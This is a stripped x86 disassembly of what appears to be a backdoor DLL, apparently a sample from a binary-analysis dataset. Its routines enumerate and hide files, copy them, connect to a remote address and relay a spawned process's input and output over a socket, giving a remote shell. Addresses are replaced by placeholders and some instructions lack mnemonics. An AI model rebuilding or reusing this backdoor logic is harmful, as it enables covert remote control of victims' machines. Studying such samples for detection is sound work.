cmp eax 0xd
ja r-xdata
lea ecx [ esp + 0x354 ]
lea edx [ esp + 0x454 ]
push ecx
push ebx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0x10
cmp ebp 0x4e
jl r-xdata
xor edx edx
mov dl [ eax + lookup_table_10006344 ]
jmp [ edx * 4 + jump_table_10006334 ]
lea edx [ esp + 0x454 ]
push ebp
push edx
call sub_10006060
add esp 0x8
test eax eax
je r-xdata
cmp ebp 0x4f
jg r-xdata
lea eax [ esp + 0x154 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
lea ecx [ esp + 0x154 ]
push ecx
call [ rw-data ]
jmp r-xdata
lea edx [ esp + 0x154 ]
push 0x44
push edx
call sub_100066d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x14 ]
push edx
call sub_10005f50
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
jmp r-xdata
lea eax [ esp + 0x454 ]
push 0x46
push eax
call sub_100066d0
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
mov eax [ rw-data ]
push 0xea60
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x154 ]
push eax
push ecx
call sub_100069e0
add esp 0x8
jmp r-xdata
mov ecx [ rw-data ]
push 0xea60
push ecx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
mov eax [ esp + 0x10 ]
push eax
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
cmp ebp 0x4f
jne r-xdata
lea ecx [ esp + 0x154 ]
push ecx
push 0x0
call sub_10006740
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
push ecx
lea eax [ esp + 0x158 ]
push edx
push eax
call sub_10006a90
add esp 0xc
test eax eax
je r-xdata
mov edx [ rw-data ]
push 0xea60
push edx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
cmp ebp 0x4f
jne r-xdata
jmp r-xdata
sub_10006360
sub esp 0x200
mov [ rw-data ] 0x4f
push edi
call sub_10006030
mov edx [ rw-data ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
cmp [ edx + ecx - 0x2 ] 0x3a
jne r-xdata
push ebx
push esi
lea eax [ esp + 0xc ]
push 0x200
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ rw-data ]
lea ecx [ esp + 0xc ]
push ecx
call [ GetFileAttributesA@IAT ]
or al 0x2
lea edx [ esp + 0xc ]
push eax
push edx
call [ SetFileAttributesA@IAT ]
mov ecx [ rw-data ]
lea eax [ esp + 0xc ]
push eax
push ecx
call sub_10006420
add esp 0x8
pop esi
pop ebx
cmp [ edx + ecx - 0x1 ] 0x5c
je r-xdata
pop edi
add esp 0x200
retn
sub_10006420
mov eax [ rw-data ]
sub esp 0xe54
test eax eax
push ebx
push ebp
push esi
push edi
je r-xdata
mov eax [ esp + 0xe68 ]
mov ebp [ sprintf@IAT ]
push eax
lea ecx [ esp + 0x868 ]
push rw-data
push ecx
call ebp
add esp 0xc
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x864 ]
push edx
push eax
call [ rw-data ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xe54
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xe54
retn
mov ebx [ esp + 0xe6c ]
push esi
call [ FindClose@IAT ]
cmp [ esp + 0x50 ] 0x2e
je r-xdata
mov esi [ esp + 0x10 ]
lea ecx [ esp + 0x24 ]
push ecx
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x164 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov al [ esp + 0x24 ]
and ecx 0x3
test al 0x10
[ edi ] [ esi ]
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
call [ GetLocalTime@IAT ]
mov eax [ esp + 0x1e ]
mov edx [ rw-data ]
mov ecx [ esp + 0x1c ]
and eax 0xffff
push edx
mov edx [ esp + 0x1e ]
push eax
mov eax [ esp + 0x1e ]
and ecx 0xffff
and edx 0xffff
push ecx
and eax 0xffff
push edx
push eax
lea ecx [ esp + 0x278 ]
push rw-data
push ecx
call ebp
mov eax [ rw-data ]
add esp 0x1c
mov edx eax
inc eax
cmp edx 0x1869f
mov [ rw-data ] eax
jle r-xdata
mov ecx [ rw-data ]
lea edx [ esp + 0x364 ]
push ecx
push rw-data
push edx
call ebp
mov eax [ rw-data ]
add esp 0xc
mov ecx eax
inc eax
cmp ecx 0x1869f
mov [ rw-data ] eax
jle r-xdata
lea eax [ esp + 0x164 ]
push 0x2e
push eax
call [ strrchr@IAT ]
mov edx [ esp + 0xe70 ]
lea ecx [ esp + 0x16c ]
mov esi eax
push ecx
push edx
lea eax [ esp + 0xc74 ]
push rw-data
push eax
call ebp
add esp 0x18
test esi esi
jne r-xdata
mov [ rw-data ] 0x0
mov eax [ esp + 0xe68 ]
lea edx [ esp + 0x164 ]
push edx
push eax
lea ecx [ esp + 0xa6c ]
push rw-data
push ecx
call ebp
lea edx [ esp + 0x374 ]
lea eax [ esp + 0x474 ]
push edx
push ebx
push rw-data
push eax
call ebp
add esp 0x20
lea ecx [ esp + 0x464 ]
push 0x0
push ecx
call [ rw-data ]
lea edx [ esp + 0x464 ]
lea eax [ esp + 0xa64 ]
push edx
push eax
call sub_10006420
add esp 0x8
test eax eax
je r-xdata
mov [ rw-data ] 0x0
inc esi
lea eax [ esp + 0x264 ]
push esi
push eax
push ebx
lea ecx [ esp + 0x670 ]
push rw-data
push ecx
call ebp
add esp 0x14
lea ecx [ esp + 0x264 ]
lea edx [ esp + 0x664 ]
push ecx
push ebx
push rw-data
push edx
call ebp
add esp 0x10
jmp r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xe54
retn
jmp r-xdata
lea edx [ esp + 0x664 ]
push 0x0
lea eax [ esp + 0xc68 ]
push edx
push eax
call [ CopyFileA@IAT ]
jmp r-xdata
sub_100066d0
sub esp 0x400
push ebx
push esi
mov esi [ esp + 0x40c ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
lea ebx [ esp + 0x11 ]
[ edi ]
mov al [ esp + 0x414 ]
mov edi esi
not ecx
dec ecx
mov [ esp + 0xc ] al
mov edx ecx
or ecx 0xffffffff
xor eax eax
add edx 0x6
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0xd ] edx
mov eax ecx
mov esi edi
mov edi ebx
push edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
call sub_10003f40
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x400
retn
sub_10006740
mov eax 0x2008
call sub_10008f00
mov eax [ rw-data ]
mov [ esp ] 0x1
cmp eax 0x53
je r-xdata
mov [ esp + 0x8 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ esp + 0x8 ] al
jmp r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx [ esp + 0x201c ]
mov edx 0x5
sub edx ebx
push esi
add eax edx
mov [ esp + 0x1d ] eax
call [ CloseHandle@IAT ]
lea eax [ esp + 0x18 ]
push 0x5
push eax
call sub_10003f40
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x18 ] 0x59
jne r-xdata
push ebx
push ebp
mov ebp [ esp + 0x2018 ]
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push ebp
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push ebp
call [ fopen@IAT ]
mov edi eax
push 0x0
push ebx
push edi
call [ fseek@IAT ]
mov eax [ rw-data ]
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
mov [ rw-data ] 0x55
call sub_10006030
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x2008
retn
lea ecx [ esp + 0x18 ]
push 0x6
push ecx
mov [ esp + 0x21 ] 0x6
call sub_10003f40
add esp 0x8
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
mov [ esp + 0x10 ] 0x0
mov ebx [ fread@IAT ]
cmp esi 0x2000
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call [ fclose@IAT ]
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2008
retn
push edi
call [ fclose@IAT ]
add esp 0x4
push 0x0
push ebp
call [ SetFileAttributesA@IAT ]
push ebp
call [ rw-data ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x2008
retn
push edi
push 0x2000
lea ecx [ esp + 0x20 ]
push 0x1
push ecx
call ebx
mov esi eax
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x28 ]
push edx
push eax
lea ecx [ esp + 0x30 ]
push 0x2000
push ecx
call sub_10004780
lea edx [ esp + 0x38 ]
push esi
push edx
call sub_10003e90
add esp 0x28
test eax eax
je r-xdata
sub_10006900
mov eax [ rw-data ]
push 0x46
push eax
call sub_100066d0
mov ecx [ rw-data ]
add esp 0x8
push 0xea60
push ecx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
retn
mov edx [ esp + 0x4 ]
mov eax [ rw-data ]
push edx
push eax
call sub_10006060
add esp 0x8
mov [ rw-data ] 0x47
jmp sub_10006030
sub_10006950
push esi
push edi
push 0xff
push rw-data
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ rw-data ]
mov eax [ rw-data ]
push 0x5c
push eax
call [ strrchr@IAT ]
mov esi eax
push esi
call sub_10005ef0
mov [ esi ] 0x0
mov ecx [ rw-data ]
push 0x59
push ecx
call sub_10006060
push rw-data
push 0x0
call sub_10006740
add esp 0x1c
push rw-data
call [ rw-data ]
pop edi
pop esi
retn
sub_100069e0
push esi
push rw-data
push rw-data
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop esi
retn
mov edx [ esp + 0x8 ]
push ebx
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov edi [ fwrite@IAT ]
push esi
not ecx
push ecx
push 0x1
push edx
call edi
mov ebx [ esp + 0x24 ]
push esi
push 0x8
push 0x1
lea eax [ ebx + 0x14 ]
push eax
call edi
push esi
push 0x4
add ebx 0x20
push 0x1
push ebx
call edi
push esi
call [ fclose@IAT ]
add esp 0x34
pop edi
pop ebx
sub_10006a40
mov eax [ rw-data ]
push esi
push edi
push 0x200
push eax
call [ rw-data ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x4f
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi [ rw-data ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call sub_10006900
add esp 0x4
pop edi
pop esi
retn
sub_10006a90
sub esp 0x18
push ebx
push ebp
mov ebp [ esp + 0x24 ]
push esi
push edi
push 0x2e
push ebp
call [ strrchr@IAT ]
mov edi [ lstrcmpiA@IAT ]
add esp 0x8
mov ebx eax
mov esi rw-data
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x18
retn
test ebx ebx
je r-xdata
push rw-data
push esi
call edi
test eax eax
je r-xdata
lea eax [ esi + 0x2 ]
lea ecx [ ebx + 0x1 ]
push eax
push ecx
call edi
test eax eax
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push ebp
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
add esi 0x10
cmp esi rw-data
jl r-xdata
jmp r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
cmp edi 0x7d0
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp edi 0xf4240
ja r-xdata
push rw-data
push ebp
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x18 ]
push edx
call [ GetSystemTime@IAT ]
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
call [ SystemTimeToFileTime@IAT ]
mov ebp [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
add ebp 0xd8a14000
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x30 ]
push edx
adc ebx 0xfffff5c8
push eax
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] ebx
call [ CompareFileTime@IAT ]
xor ecx ecx
pop edi
test eax eax
setge cl
pop esi
pop ebp
mov eax ecx
pop ebx
add esp 0x18
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x18
retn
sub_10006bc0
push ecx
mov eax [ rw-data ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
push rw-data
push rw-data
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
mov eax [ rw-data ]
or ecx 0xffffffff
mov [ rw-data ] 0x1
lea edx [ eax + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
mov ebx ecx
cmp ebx 0x114
jae r-xdata
mov esi [ rw-data ]
mov eax [ rw-data ]
push eax
call [ fclose@IAT ]
add esp 0x4
mov [ rw-data ] 0x45
call sub_10006030
pop edi
pop esi
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebx
pop ecx
retn
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push eax
mov edx ecx
mov esi edi
mov edi rw-data
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x4f
call sub_10006030
push rw-data
push rw-data
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
sub eax ebx
lea esi [ ecx + ebx + 0x5 ]
sub eax 0x5
jmp r-xdata
mov [ rw-data ] 0x45
call sub_10006030
pop edi
pop esi
pop ebx
pop ecx
retn
push rw-data
call [ fopen@IAT ]
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
lea edx [ esp + 0xc ]
mov [ esp + 0xc ] eax
push edx
push esi
push eax
push esi
call sub_10004780
mov eax [ esp + 0x1c ]
push edi
push eax
push 0x1
push esi
call [ fwrite@IAT ]
push edi
call [ fclose@IAT ]
mov eax [ rw-data ]
add esp 0x24
test eax eax
je r-xdata
sub_10006d10
sub esp 0x254
push ebp
mov ebp [ esp + 0x25c ]
push esi
push edi
push rw-data
push ebp
call [ strstr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x1c ]
lea edx [ esp + 0x1c ]
[ edi ]
lea ecx [ esp + 0xc ]
mov [ esp + 0x48 ] 0x1
push ecx
push edx
push eax
push eax
push eax
push eax
push eax
push eax
push ebp
push eax
mov [ esp + 0x74 ] ax
call [ rw-data ]
pop edi
pop esi
pop ebp
add esp 0x254
retn
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x60 ]
mov eax ecx
mov esi edi
mov edi edx
push 0x22
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ strchr@IAT ]
lea ecx [ esp + 0x64 ]
push ecx
call esi
add esp 0x8
test eax eax
je r-xdata
inc eax
push 0x22
push eax
call esi
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x60 ]
push 0x5c
push edx
mov [ eax ] 0x0
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x1 ] 0x0
jmp r-xdata
lea eax [ esp + 0x61 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_10006df0
sub esp 0x400
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x200 ]
push ebx
push esi
push edi
mov edi [ rw-data ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x20c ]
or ecx 0xffffffff
[ edi ]
mov eax [ rw-data ]
not ecx
dec ecx
mov ebx ecx
inc ebx
cmp ebx eax
jge r-xdata
mov [ rw-data ] 0x4f
call sub_10006030
pop edi
pop esi
pop ebx
add esp 0x400
retn
push ebp
lea edx [ esp + 0x10 ]
push 0x4c
push edx
call sub_10006060
add esp 0x8
lea ecx [ esp + 0x10 ]
push ecx
call [ rw-data ]
jmp r-xdata
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
lea ebp [ esp + 0x10 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ rw-data ]
lea edx [ ecx + ebx ]
or ecx 0xffffffff
mov edi edx
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x14 ]
push edx
lea ebx [ ebx + ecx + 0x1 ]
call [ SetFileAttributesA@IAT ]
mov eax [ rw-data ]
cmp [ eax + ebx ] 0x30
jne r-xdata
pop ebp
mov eax [ rw-data ]
inc ebx
cmp ebx eax
jl r-xdata
sub_10006f10
mov edx [ rw-data ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
push edx
call [ rename@IAT ]
add esp 0x8
neg eax
sbb al al
and al 0xf6
add al 0x4f
mov [ rw-data ] al
call sub_10006030
pop edi
retn
sub_10006f50
push ecx
mov edx [ rw-data ]
push ebx
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi edx
push edx
mov bl [ ecx + edx + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi edx
mov al [ ecx + edx + 0x2 ]
or ecx 0xffffffff
mov [ esp + 0xe ] al
xor eax eax
[ edi ]
not ecx
dec ecx
mov cl [ ecx + edx + 0x3 ]
mov [ esp + 0xf ] cl
call [ GetFileAttributesA@IAT ]
mov cl 0x31
pop edi
cmp bl cl
pop ebx
jne r-xdata
and al 0xfe
or al 0x1
jmp r-xdata
and al 0xfd
or al 0x2
jmp r-xdata
cmp [ esp + 0x2 ] cl
jne r-xdata
and al 0xfb
or al 0x4
jmp r-xdata
cmp [ esp + 0x3 ] cl
jne r-xdata
mov edx [ rw-data ]
push eax
push edx
call [ SetFileAttributesA@IAT ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_10006030
pop ecx
retn
sub_10007000
mov eax [ rw-data ]
push 0x0
push 0x2
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] 0x45
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] 0x4f
jmp r-xdata
jmp sub_10006030
sub_10007040
push ecx
mov [ rw-data ] 0x4f
call sub_10006030
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop ecx
retn
lea eax [ esp ]
push eax
push 0x0
push 0x0
push sub_10007070
push 0x0
push 0x0
call [ CreateThread@IAT ]
sub_10007070
mov eax 0x1538
call sub_10008f00
push ebx
push ebp
push esi
xor esi esi
push edi
lea eax [ esp + 0x28 ]
push esi
lea ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x20 ]
or ebx 0xffffffff
mov ebp 0x1
push ecx
push edx
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] ebx
mov [ rw-data ] ebp
mov [ esp + 0x38 ] 0xc
mov [ esp + 0x3c ] esi
mov [ esp + 0x40 ] ebp
call [ rw-data ]
lea eax [ esp + 0x28 ]
push esi
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x24 ]
push ecx
push edx
call [ rw-data ]
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x4c ]
mov edx [ rw-data ]
[ edi ]
mov eax [ esp + 0x1c ]
mov ecx [ rw-data ]
mov [ esp + 0x84 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x8c ] eax
mov [ esp + 0x88 ] eax
mov [ esp + 0x34 ] ecx
lea eax [ esp + 0x3c ]
lea ecx [ esp + 0x4c ]
push eax
push ecx
push esi
push esi
push esi
mov [ esp + 0x4c ] edx
push ebp
push esi
lea edx [ esp + 0x50 ]
push esi
push edx
push esi
mov [ esp + 0xa0 ] 0x101
mov [ esp + 0xa4 ] si
call [ rw-data ]
push 0x3e8
call [ Sleep@IAT ]
call sub_10007430
mov ebp eax
cmp ebp esi
je r-xdata
mov edx [ esp + 0x3c ]
push esi
push edx
call [ rw-data ]
mov [ rw-data ] esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1538
retn 0x4
mov eax [ rw-data ]
lea edx [ esp + 0x90 ]
cmp eax esi
mov edi rw-data
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ rw-data ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x90 ]
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0x3
push ecx
mov ecx [ rw-data ]
push 0x1
push rw-data
push ecx
push edx
call [ inet_ntoa@IAT ]
push eax
lea eax [ esp + 0x1a4 ]
push eax
call sub_100043e0
lea edi [ esp + 0x1a8 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x90 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x90 ]
mov [ esp + edx + 0x190 ] ecx
or ecx 0xffffffff
add edx 0x4
lea esi [ esp + 0x90 ]
[ edi ]
not ecx
dec ecx
lea edi [ esp + edx + 0x190 ]
mov eax ecx
push 0x0
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x94 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
add ecx edx
push ecx
lea ecx [ esp + 0x198 ]
push ecx
push ebp
call [ rw-data ]
mov esi [ Sleep@IAT ]
push 0x64
mov edi rw-data
test ebx ebx
jg r-xdata
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
push eax
lea eax [ esp + 0xd54 ]
push eax
push ecx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp ebx 0x7ff
mov eax 0x7ff
ja r-xdata
push ebp
call sub_100046a0
add esp 0x4
test eax eax
je r-xdata
push ebp
call [ closesocket@IAT ]
xor esi esi
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
lea ecx [ esp + 0xd4c ]
push eax
push ecx
push ebp
call [ recv@IAT ]
test eax eax
jle r-xdata
mov eax ebx
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
add edx 0x4
push edx
push 0x1
push rw-data
push eax
push ecx
call [ inet_ntoa@IAT ]
lea edx [ esp + 0x1a0 ]
push eax
push edx
call sub_100043e0
lea edi [ esp + 0x1a8 ]
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
mov eax [ esp + 0x10 ]
lea esi [ esp + 0xd48 ]
not ecx
dec ecx
mov ebx ecx
mov ecx eax
mov edx ecx
mov [ esp + ebx + 0x190 ] eax
add ebx 0x4
shr ecx 0x2
lea edi [ esp + ebx + 0x190 ]
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
add ebx eax
[ edi ] [ esi ]
push ebp
mov [ esp + 0x18 ] 0xffffffff
call [ closesocket@IAT ]
push 0x64
call esi
call sub_10007430
mov ebp eax
test ebp ebp
je r-xdata
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
push 0x0
push edx
sub ebx eax
push eax
lea eax [ esp + 0xd54 ]
mov [ esp + 0x20 ] ebx
push eax
push ecx
call [ rw-data ]
test eax eax
je r-xdata
cmp eax 0x3e800
jge r-xdata
sub ebx eax
test ebx ebx
jg r-xdata
push 0xa
jmp r-xdata
push ebp
call sub_100074d0
add esp 0x4
cmp eax 0xffffffff
mov [ esp + 0x14 ] eax
je r-xdata
push 0x0
lea eax [ esp + 0x194 ]
push ebx
push eax
push ebp
call [ rw-data ]
test eax eax
jl r-xdata
push 0xa
call [ Sleep@IAT ]
mov esi [ Sleep@IAT ]
mov ebx [ esp + 0x14 ]
jmp r-xdata
call esi
mov ebx eax
mov ecx [ esp + 0x18 ]
push 0x0
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0xd54 ]
push 0x800
push eax
push ecx
call [ PeekNamedPipe@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub_10007430
sub esp 0x10
push ebx
mov ebx [ rw-data ]
push esi
push edi
mov edi [ rw-data ]
push 0x0
push 0x1
push 0x2
call [ socket@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
push ebx
mov [ esp + 0x10 ] 0x2
call [ htons@IAT ]
mov [ esp + 0xe ] ax
lea eax [ esp + 0xc ]
push 0x10
push eax
push esi
mov [ esp + 0x1c ] edi
call [ connect@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x10
retn
push esi
call [ closesocket@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x10
retn
push rw-data
call [ inet_addr@IAT ]
mov ebx [ rw-data ]
mov edi eax
sub_100074d0
mov ecx [ esp + 0x4 ]
sub esp 0x10
lea eax [ esp ]
push 0x0
push 0x4
push eax
push ecx
call [ recv@IAT ]
cmp eax 0x4
je r-xdata
mov eax [ esp ]
add esp 0x10
retn
or eax 0xffffffff
add esp 0x10
retn
sub_10007500
push ecx
push esi
push edi
push 0x3e800
mov esi 0x5
call [ malloc@IAT ]
mov edi eax
add esp 0x4
test edi edi
je r-xdata
lea ecx [ esp + 0x8 ]
lea eax [ edi + 0x5 ]
push ecx
lea edx [ esi - 0x5 ]
push eax
push edx
push eax
mov [ edi + 0x1 ] esi
call sub_10004780
push esi
push edi
call sub_10003f40
push edi
call [ free@IAT ]
add esp 0x1c
pop edi
pop esi
pop ecx
retn
lea eax [ edi + 0x5 ]
mov [ edi ] 0x61
push eax
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_100076b0
lea esi [ eax + 0x5 ]
mov [ esp + 0x14 ] eax
mov [ edi + esi ] 0x1
inc esi
lea eax [ edi + esi ]
push eax
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_10007730
add esp 0x18
mov [ esp + 0x8 ] eax
add esi eax
sub_10007590
push esi
mov esi [ rw-data ]
push edi
or ecx 0xffffffff
lea edx [ esi + 0x4 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
lea eax [ ecx + edx + 0x1 ]
push eax
mov eax [ esi ]
push edx
push eax
call sub_100078f0
add esp 0xc
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
call sub_10006030
pop edi
pop esi
retn
sub_100075d0
push ebx
mov ebx [ rw-data ]
push esi
push edi
lea edx [ ebx + 0x4 ]
